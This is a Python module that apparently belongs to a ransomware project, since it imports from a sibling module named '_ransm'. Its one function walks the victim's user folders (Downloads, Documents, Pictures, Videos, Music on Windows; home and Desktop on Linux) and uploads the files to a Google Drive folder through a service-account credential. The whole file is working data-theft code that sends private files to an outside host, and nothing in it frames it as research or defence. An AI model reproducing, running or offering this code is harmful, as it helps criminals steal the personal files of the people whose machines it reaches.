import os
import mimetypes
import getpass
from ._ransm import username,discover_os
from dotenv import load_dotenv
from google.oauth2 import service_account
from googleapiclient.discovery import build,MediaFileUpload

load_dotenv()
SCOPES = ['https://www.googleapis.com/auth/drive'] #Drive Api URL
SERVICE_ACCOUNT_FILE = '7e487aba288c6dd34ef03c2ef41dcf469a9119b18cb22910b6a4c38eff1db98b.json' # Json File Name
The_Folder = os.getenv("PARENT_FOLDER_ID")
'''
Function To Upload Client Data To Google Drive
'''
def upload_file():
    usr = username()
    ost = discover_os()
    #------------------------------------------|Windows|---------------------------------------
    if ost == 'Windows':
        file_path = [f"C:/Users/{usr}/Downloads/",f"C:/Users/{usr}/Music",f"C:/Users/{usr}/Documents",f"C:/Users/{usr}/Videos",f"C:/Users/{usr}/Pictures"]
    #------------------------------------------|Linux|-----------------------------------------
    if ost == 'Linux':
        lnxusr = getpass.getuser()
        file_path = [f"/home/{lnxusr}/",f"/home/{lnxusr}/Desktop/"]
    #------------------------------------------|Credentials|-------------------------------------
    creds = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE,scopes = SCOPES)
    service = build('drive','v3',credentials=creds)
    for path in file_path:
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                file_mime_type = mimetypes.guess_type(file_path)[0]
                file_meta_data = {
                    'name':file,
                    'mimeType': file_mime_type,
                    'parents':[The_Folder]
                    }
                try:
                    media_body = MediaFileUpload(file_path,mimetype=file_meta_data['mimeType'])
                    file = service.files().create(body=file_meta_data, media_body=media_body, fields='id').execute()
                    return file
                except Exception as e:
                    print(f"Error uploading {file_path}: {e}")
                    pass
                    
         
